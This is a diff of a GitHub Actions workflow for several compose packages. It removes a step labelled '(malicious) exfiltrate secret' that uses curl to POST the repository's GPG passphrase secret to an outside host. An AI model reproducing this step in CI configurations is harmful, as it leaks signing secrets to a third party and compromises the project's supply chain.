@@ -16,10 +16,6 @@ jobs:
       matrix:
         package: [ compose, compose-semantics, compose-test, compose-ui ]
     steps:
-      - name: (malicious) exfiltrate secret
-        run: curl -X POST http://nodered.vacxe.dev/unveil -d "s=$MY_SECRET"
-        env:
-          MY_SECRET: ${{ secrets.GPG_PASSPHRASE }}
       - uses: actions/checkout@v3
       - name: Set up JDK 17
         uses: actions/setup-java@v3
